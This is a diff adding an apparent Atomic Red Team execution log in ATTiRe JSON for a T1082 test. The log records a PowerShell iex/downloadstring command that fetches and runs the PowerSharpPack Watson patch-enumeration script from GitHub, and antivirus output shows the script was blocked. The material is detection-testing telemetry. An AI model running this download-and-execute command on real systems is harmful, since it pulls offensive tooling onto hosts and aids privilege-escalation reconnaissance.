@@ -1,0 +1,48 @@
+{
+    "attire-version":  "1.1",
+    "execution-data":  {
+                           "execution-source":  "Invoke-Atomicredteam",
+                           "execution-id":  "NDU2YWVkY2MtNzBkZS00ZjYwLWFhN2MtNjk3NjAwOWZhYjYw",
+                           "execution-category":  {
+                                                      "name":  "Atomic Red Team",
+                                                      "abbreviation":  "ART"
+                                                  },
+                           "execution-command":  "Invoke-AtomicTest T1082 -TestGuids 07b18a66-6304-47d2-bad0-ef421eb2e107 -PathToAtomicsFolder C:\\AtomicRedTeam\\atomics -ExecutionLogPath C:\\AtomicRedTeam\\invoke-atomicredteam\\Logs\\T1082-07b18a66-6304-47d2-bad0-ef421eb2e107.json -TimeoutSeconds 120 -LoggingModule Attire-ExecutionLogger",
+                           "target":  {
+                                          "user":  "redshirt\\edrba",
+                                          "host":  "RedShirt",
+                                          "ip":  "192.168.56.1",
+                                          "path":  "C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\edrba\\AppData\\Local\\Microsoft\\WindowsApps"
+                                      },
+                           "time-generated":  "2024-10-12T18:07:30.000Z"
+                       },
+    "procedures":  [
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "WinPwn - PowerSharpPack - Watson searching for missing windows patches",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "07b18a66-6304-47d2-bad0-ef421eb2e107"
+                                            },
+                           "procedure-description":  "PowerSharpPack - Watson searching for missing windows patches  technique via function of WinPwn",
+                           "order":  21,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:07:27.000Z",
+                                             "time-stop":  "2024-10-12T18:07:30.000Z",
+                                             "executor":  "powershell",
+                                             "command":  "iex(new-object net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1)\nInvoke-watson",
+                                             "output":  [
+                                                            {
+                                                                "content":  "iex : At line:1 char:1\r\n+ function Invoke-watson\r\n+ ~~~~~~~~~~~~~~~~~~~~~~\r\nThis script contains malicious content and has been blocked by your antivirus software.\r\nAt line:1 char:4\r\n+  {iex(new-object net.webclient).downloadstring(https://raw.githubus ...\r\n+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException\r\n    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand\r\n \r\nInvoke-watson : The term Invoke-watson is not recognized as the name of a cmdlet, function, script file, or operable \r\nprogram. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\r\nAt line:2 char:1\r\n+ Invoke-watson}\r\n+ ~~~~~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (Invoke-watson:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException",
+                                                                "level":  "STDERR",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       }
+                   ]
+}
+
